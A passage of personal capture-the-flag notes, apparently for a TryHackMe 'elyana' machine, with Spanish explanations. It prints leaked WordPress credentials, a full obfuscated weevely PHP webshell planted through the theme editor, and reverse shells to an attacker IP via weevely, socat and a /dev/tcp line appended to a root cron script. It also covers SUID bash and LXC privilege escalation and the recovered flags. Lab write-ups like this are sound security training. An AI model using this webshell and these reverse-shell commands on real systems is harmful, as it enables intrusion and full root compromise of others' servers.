QogKg0KICogQ2hhbmdlIHRoZXNlIHRvIGRpZmZlcmVudCB1bmlxdWUgcGhyYXNlcyENCiAqIFlvdSBjYW4gZ2VuZXJhdGUgdGhlc2UgdXNpbmcgdGhlIHtAbGluayBodHRwczovL2FwaS53b3JkcHJlc3Mub3JnL3NlY3JldC1rZXkvMS4xL3NhbHQvIFdvcmRQcmVzcy5vcmcgc2VjcmV0LWtleSBzZXJ2aWNlfQ0KICogWW91IGNhbiBjaGFuZ2UgdGhlc2UgYXQgYW55IHBvaW50IGluIHRpbWUgdG8gaW52YWxpZGF0ZSBhbGwgZXhpc3RpbmcgY29va2llcy4gVGhpcyB3aWxsIGZvcmNlIGFsbCB1c2VycyB0byBoYXZlIHRvIGxvZyBpbiBhZ2Fpbi4NCiAqDQogKiBAc2luY2UgMi42LjANCiAqLw0KZGVmaW5lKCAnQVVUSF9LRVknLCAgICAgICAgICd6a1klbSVSRlliOnUsL2xxLWlafjhmakVOZElhU2I9Xms8M1pyLzBEaUxacVB4enxBdXFsaTZsWi05RFJhZ0pQJyApOw0KZGVmaW5lKCAnU0VDVVJFX0FVVEhfS0VZJywgICdpQVlhazxfJn52OW8re2JAUlBSNjJSOSBUeS0gNlUteUg1YmFVRHs7bmRTaUNbXXFvc3hTQHNjdSZTKWQkSFtUJyApOw0KZGVmaW5lKCAnTE9HR0VEX0lOX0tFWScsICAgICdhUGRfKnNCZj1adWMrK2FdNVZnOT1QfnUwM1EsenZwW2VVZS99KUQ9Ok55aFVZe0tYUl10N300MlVwa1tyNz9zJyApOw0KZGVmaW5lKCAnTk9OQ0VfS0VZJywgICAgICAgICdAaTtUKHt4Vi9mdkUhcyteZGU3ZTRMWDN9TlRAIGo7YjRbejNfZkZKYmJXKG5vIDNPN0ZAc3gwIW95KE9gaCNNJyApOw0KZGVmaW5lKCAnQVVUSF9TQUxUJywgICAgICAgICdCIEFUQGk' | base64 -d
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'elyana' );

/** MySQL database password */
define( 'DB_PASSWORD', 'H@ckme@123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

wordpress;
define( 'WP_SITEURL', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');
define( 'WP_HOME', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'zkY%m%RFYb:u,/lq-iZ~8fjENdIaSb=^k<3Zr/0DiLZqPxz|Auqli6lZ-9DRagJP' );
define( 'SECURE_AUTH_KEY',  'iAYak<_&~v9o+{b@RPR62R9 Ty- 6U-yH5baUD{;ndSiC[]qosxS@scu&S)d$H[T' );
define( 'LOGGED_IN_KEY',    'aPd_*sBf=Zuc++a]5Vg9=P~u03Q,zvp[eUe/})D=:NyhUY{KXR]t7}42Upk[r7?s' );
define( 'NONCE_KEY',        '@i;T({xV/fvE!s+^de7e4LX3}NT@ j;b4[z3_fFJbbW(no 3O7F@sx0!oy(O`h#M' );
define( 'AUTH_SALT',        'B AT@ibase64: invalid input

elyana: H@ckme@123

┌──(kali㉿kali)-[~]
└─$ ssh elyana@10.10.161.184            
The authenticity of host '10.10.161.184 (10.10.161.184)' can't be established.
ED25519 key fingerprint is SHA256:Rm7wS3JV0q1IHCuI5dWaanuCoSlTYECCa9jTEE4BFsI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.161.184' (ED25519) to the list of known hosts.
elyana@10.10.161.184's password: 
Permission denied, please try again.

Webshell file upload

┌──(kali㉿kali)-[~]
└─$ weevely generate witty agent.php
Generated 'agent.php' with password 'witty' of 707 byte size.
                                                                                                           
┌──(kali㉿kali)-[~]
└─$ cat agent.php
<?php
$A=str_replace('rj','','crerjatrje_rjfurjnrjrjction');
$W='~match(~"/$k~h(.+~)$kf~/~",~@fil~e_~get_~contents("php://input"),$m)=';
$S='l);$~j++,$i~++){$o.=$t{~$i}^$k{~$j};}~}ret~urn $o;}if (~@preg_';
$N='l=strle~n(~$t);$o="";for($i~~=0;$i<$~l;){for($~j=0;($j<$~c&~&$i<~$';
$X='~=1~) {@ob_sta~rt()~;@eva~l(@~gzun~comp~ress(@x(@base6~4_decod~e~(';
$Z='@~base6~4_enco~de(@x~(@gzco~m~press($o),$k));p~rin~t~("$p$kh$r$kf");}';
$B='$m[1]),~$k)))~;$o=@o~b_g~et_contents();~@ob_e~n~d_clean(~);$r=';
$d='~$k="07c~a0be~a";$kh="b7f~f339~bb612";$kf=~"d1539~23acf13"~;$~p';
$k='="XAQ~VvKe~B0ry~tf~w1U";functio~n x($t,$k)~~~{$c=s~trlen($k);~$';
$w=str_replace('~','',$d.$k.$N.$S.$W.$X.$B.$Z);
$i=$A('',$w);$i();
?>

http://10.10.161.184/wordpress/wp-admin/

login elyana: H@ckme@123

http://10.10.161.184/wordpress/wp-login.php?redirect_to=http%3A%2F%2F10.10.161.184%2Fwordpress%2Fwp-admin%2F&reauth=1


or can be with revshell php from pentestmonkey

go to appearance and theme editor and upload agent.php

┌──(kali㉿kali)-[~]
└─$ weevely http://10.10.161.184/wordpress/wp-content/themes/twentytwenty/404.php witty

[+] weevely 4.0.1

[+] Target:     10.10.161.184
[+] Session:    /home/kali/.weevely/sessions/10.10.161.184/404_0.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely> whoami
www-data
www-data@elyana:/var/www/html/wordpress/wp-content/themes/twentytwenty $ 

:)

www-data@elyana:/var/www/html/wordpress/wp-content/themes/twentytwenty $ cd /home/elyana
www-data@elyana:/home/elyana $ ls
hint.txt
user.txt
www-data@elyana:/home/elyana $ cat user.txt
cat: user.txt: Permission denied
www-data@elyana:/home/elyana $ cat hint.txt
Elyana's user password is hidden in the system. Find it ;)

revshell 

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337

www-data@elyana:/home/elyana $ :backdoor_reversetcp 10.8.19.103 1337 -s bash
Error binding socket: '[Errno 98] Address already in use'
Error binding socket: '[Errno 98] Address already in use'
Error binding socket: '[Errno 98] Address already in use'
Error binding socket: '[Errno 98] Address already in use'
Error binding socket: '[Errno 98] Address already in use'
Error binding socket: '[Errno 98] Address already in use'
Error binding socket: '[Errno 98] Address already in use'
Error binding socket: '[Errno 98] Address already in use'

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.161.184.
Ncat: Connection from 10.10.161.184:60536.
bash: cannot set terminal process group (1010): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ whoami
whoami
www-data

:)

stabilizing shell

bash-4.4$ find / -user elyana -type f 2>&1 | grep -v "Permission" | grep -v "No such"
such"/ -user elyana -type f 2>&1 | grep -v "Permission" | grep -v "No s
/home/elyana/user.txt
/home/elyana/.bash_logout
/home/elyana/hint.txt
/home/elyana/.bash_history
/home/elyana/.profile
/home/elyana/.sudo_as_admin_successful
/home/elyana/.bashrc
/etc/mysql/conf.d/private.txt

Este comando utiliza la herramienta "find" para buscar archivos en todo el sistema de archivos (raíz "/") que tengan el propietario "elyana" y el tipo "f" (archivo). La opción "-user" especifica que se deben buscar archivos con propietario "elyana" y la opción "-type" especifica que se deben buscar solo archivos (en lugar de directorios, enlaces simbólicos, etc.).

El comando también redirige la salida de error (2>) a la salida estándar (1) y luego utiliza "grep" para filtrar la salida. Las opciones "-v" de "grep" hacen que se excluyan las líneas que contienen las cadenas "Permission" o "No such", lo que significa que se omitirán las líneas de error que se generen por falta de permisos o porque no existe el archivo o el directorio especificado.

En resumen, este comando busca todos los archivos en el sistema de archivos que tengan el propietario "elyana" y muestra solo las líneas de resultado que no contengan errores de permisos o de archivo no encontrado. Esto puede ser útil para encontrar archivos específicos que se hayan creado o modificado por un usuario determinado, o para verificar si un usuario ha creado o modificado archivos en el sistema.

bash-4.4$ cat /etc/mysql/conf.d/private.txt

cat /etc/mysql/conf.d/private.txt
user: elyana
password: E@syR18ght

bash-4.4$ su elyana
su elyana
Password: E@syR18ght

bash-4.4$ cd /home/elyana
cd /home/elyana
bash-4.4$ ls
ls
hint.txt  user.txt
bash-4.4$ cat user.txt
cat user.txt
VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
echo 'VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259' | base64 -d
THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}

┌──(kali㉿kali)-[~]
└─$ ssh elyana@10.10.161.184            
elyana@10.10.161.184's password: E@syR18ght
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Dec 25 19:41:03 UTC 2022

  System load:  0.08              Processes:           121
  Usage of /:   53.3% of 6.41GB   Users logged in:     0
  Memory usage: 68%               IP address for eth0: 10.10.161.184
  Swap usage:   0%


16 packages can be updated.
0 updates are security updates.


Last login: Fri Oct  9 08:09:56 2020
-bash-4.4$ whoami
elyana
-bash-4.4$ 

privesc

-bash-4.4$ sudo -l
Matching Defaults entries for elyana on elyana:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elyana may run the following commands on elyana:
    (ALL) NOPASSWD: /usr/bin/socat


┌──(kali㉿kali)-[~]
└─$ socat file:`tty`,raw,echo=0 tcp-listen:3333

-bash-4.4$ sudo socat tcp-connect:10.8.19.103:3333 exec:bash,pty,stderr,setsid,sigint,sane

┌──(kali㉿kali)-[~]
└─$ socat file:`tty`,raw,echo=0 tcp-listen:3333
root@elyana:~# whoami
root
root@elyana:~# cd /root
root@elyana:/root# ls
root.txt
root@elyana:/root# cat root.txt
VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9  

┌──(kali㉿kali)-[~]
└─$ echo 'VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9' |base64 -d
THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}    


another way

-bash-4.4$ find / -perm -4000 2> /dev/null | xargs ls -lah
-rwsr-sr-x 1 root   root       1.1M Jun  6  2019 /bin/bash
-rwsr-sr-x 1 root   root        59K Jan 18  2018 /bin/chmod
-rwsr-xr-x 1 root   root        31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root   root        43K Sep 16  2020 /bin/mount
-rwsr-xr-x 1 root   root        63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root   root        44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root   root        27K Sep 16  2020 /bin/umount
-rwsr-sr-x 1 daemon daemon      51K Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root   root        75K Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root   root        44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root   root        75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-sr-x 1 root   root        11M Nov 23  2018 /usr/bin/lxc
-rwsr-xr-x 1 root   root        37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root        40K Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root   root        37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root        59K Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root   root        22K Mar 27  2019 /usr/bin/pkexec
-rwsr-sr-x 1 root   root       392K Apr  4  2018 /usr/bin/socat
-rwsr-xr-x 1 root   root       146K Jan 31  2020 /usr/bin/sudo
-rwsr-xr-x 1 root   root        19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-- 1 root   messagebus  42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root        10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root       427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root        14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   root       111K Jul 10  2020 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root        99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

or

-bash-4.4$ find / -perm -u=s -type f 2>/dev/null | xargs ls -lah
-rwsr-sr-x 1 root   root       1.1M Jun  6  2019 /bin/bash
-rwsr-sr-x 1 root   root        59K Jan 18  2018 /bin/chmod
-rwsr-xr-x 1 root   root        31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root   root        43K Sep 16  2020 /bin/mount
-rwsr-xr-x 1 root   root        63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root   root        44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root   root        27K Sep 16  2020 /bin/umount
-rwsr-sr-x 1 daemon daemon      51K Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root   root        75K Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root   root        44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root   root        75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-sr-x 1 root   root        11M Nov 23  2018 /usr/bin/lxc
-rwsr-xr-x 1 root   root        37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root        40K Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root   root        37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root        59K Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root   root        22K Mar 27  2019 /usr/bin/pkexec
-rwsr-sr-x 1 root   root       392K Apr  4  2018 /usr/bin/socat
-rwsr-xr-x 1 root   root       146K Jan 31  2020 /usr/bin/sudo
-rwsr-xr-x 1 root   root        19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-- 1 root   messagebus  42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root        10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root       427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root        14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   root       111K Jul 10  2020 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root        99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

https://gtfobins.github.io/gtfobins/bash/


-bash-4.4$ /bin/bash -p
bash-4.4# whoami
root

Este comando utiliza la herramienta "find" para buscar archivos en todo el sistema de archivos (raíz "/") que tengan el permiso de ejecución de setuid (u=s) habilitado. La opción "-perm" especifica que se deben buscar archivos con permisos específicos y la opción "-type" especifica que se deben buscar solo archivos (en lugar de directorios, enlaces simbólicos, etc.).

El comando también redirige la salida de error (2>) a "/dev/null", que es un archivo especial que descarta cualquier salida enviada a él. Esto significa que no se mostrarán mensajes de error en la salida del comando.

En resumen, este comando busca todos los archivos en el sistema de archivos que tengan el permiso de ejecución de setuid habilitado y no muestra mensajes de error. Esto puede ser útil para encontrar archivos que tienen permisos de ejecución de setuid configurados y comprobar si están en uso en el sistema.

Es importante tener en cuenta que los archivos con permiso de ejecución de setuid pueden ser peligrosos si no se usan adecuadamente, ya que permiten a los usuarios ejecutar el archivo con los privilegios del propietario del archivo, incluso si no tienen permisos de superusuario. Por lo tanto, es importante asegurarse de que solo se habiliten los permisos de setuid en archivos confiables y seguros.

another way

-bash-4.4$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /var/backups/script.sh

-bash-4.4$ cat /var/backups/script.sh
#!/bin/bash

#Just a test script, might use it later to for a cron task 

-bash-4.4$ echo "bash -i >& /dev/tcp/10.8.19.103/8888 0>&1" >> /var/backups/script.sh

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 8888
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.161.184.
Ncat: Connection from 10.10.161.184:43450.
bash: cannot set terminal process group (2097): Inappropriate ioctl for device
bash: no job control in this shell
root@elyana:~# whoami
whoami
root

another way (lxc)

LXC (Linux Containers) es un sistema de contenedores de Linux que permite a los usuarios ejecutar múltiples entornos aislados dentro de un único sistema operativo host. Cada entorno aislado se conoce como contenedor y tiene su propio espacio de usuario, procesos y recursos, como archivos, memoria y red.

LXC se basa en tecnologías de virtualización ligera, como cgroups y namespaces, para aislar los contenedores del host y de otros contenedores. Esto permite a los usuarios ejecutar diferentes versiones de sistemas operativos, aplicaciones y entornos de desarrollo dentro de un único host, lo que facilita la gestión y el aprovechamiento de los recursos del sistema.

LXC se utiliza ampliamente en entornos de producción y de desarrollo para aislar servicios y aplicaciones, probar y desplegar aplicaciones en diferentes entornos y reducir la sobrecarga de la máquina virtual completa. También se utiliza para implementar soluciones de contenedores a gran escala, como Kubernetes y Docker.

https://github.com/saghul/lxd-alpine-builder.git](https://github.com/saghul/lxd-alpine-builder.git

┌──(kali㉿kali)-[~/confidential/gamingserver]
└─$ cd lxd-alpine-builder                   
                                                                                                           
┌──(kali㉿kali)-[~/confidential/gamingserver/lxd-alpine-builder]
└─$ ls
alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  README.md
alpine-v3.16-x86_64-20220919_1406.tar.gz  LICENSE

┌──(kali㉿kali)-[~/confidential/gamingserver/lxd-alpine-builder]
└─$ sudo python3 -m http.server    
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

-bash-4.4$ wget http://10.8.19.103:8000/alpine-v3.16-x86_64-20220919_1406.tar.gz
--2022-12-25 20:13:13--  http://10.8.19.103:8000/alpine-v3.16-x86_64-20220919_1406.tar.gz
Connecting to 10.8.19.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3211484 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.16-x86_64-20220919_1406.tar.gz’

alpine-v3.16-x86_64-202209 100%[=======================================>]   3.06M   281KB/s    in 12s     

2022-12-25 20:13:25 (270 KB/s) - ‘alpine-v3.16-x86_64-20220919_1406.tar.gz’ saved [3211484/3211484]

-bash-4.4$ ls
alpine-v3.16-x86_64-20220919_1406.tar.gz
systemd-private-924375ecefe542fc90745e2f73214a17-apache2.service-7jrI0u
systemd-private-924375ecefe542fc90745e2f73214a17-systemd-resolved.service-8CHgwF
systemd-private-924375ecefe542fc90745e2f73214a17-systemd-timesyncd.service-kFmtRd


-bash-4.4$ lxc image import ./alpine-v3.16-x86_64-20220919_1406.tar.gz --alias alpine
Image imported with fingerprint: 46ea16cf67c2a57b3995b13e0111f75abd5618ac91147f47559fb22c8ee884d7
-bash-4.4$ lxc image list
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| alpine | 46ea16cf67c2 | no     | alpine v3.16 (20220919_14:06) | x86_64 | 3.06MB | Dec 25, 2022 at 8:14pm (UTC) |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+

-bash-4.4$ lxc init alpine ignite -c security.privileged=true
Creating ignite
-bash-4.4$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
-bash-4.4$ lxc start ignite
-bash-4.4$ lxc exec ignite /bin/sh
~ # whoami
root

~ # cd /mnt/root/root
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt
VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9

:)

Was really fun!


```

![[Pasted image 20221225122239.png]]

![[Pasted image 20221225142300.png]]
![[Pasted image 20221225142640.png]]

![[Pasted image 20221225142735.png]]

user.txt

*THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}*

root.txt

*THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}*


[[Poster]]